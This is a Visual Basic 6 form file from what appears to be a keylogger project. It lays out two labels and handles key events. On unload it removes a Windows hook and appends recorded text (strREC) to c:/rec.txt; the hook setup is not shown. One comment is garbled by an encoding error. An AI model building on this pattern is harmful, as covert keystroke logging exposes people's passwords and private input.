VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.Label Label2 
      Caption         =   "Label2"
      Height          =   975
      Left            =   600
      TabIndex        =   1
      Top             =   1920
      Width           =   2655
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   855
      Left            =   720
      TabIndex        =   0
      Top             =   240
      Width           =   2535
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)
Label2.Caption = "keydown"
End Sub

 

Private Sub Form_KeyUp(KeyCode As Integer, Shift As Integer)
Label2.Caption = "keyup"
End Sub

Private Sub Form_Unload(Cancel As Integer)
Call UnhookWindowsHookEx(hHook)
Open "c:/rec.txt" For Append As #1
Print #1, strREC
Close #1
End Sub
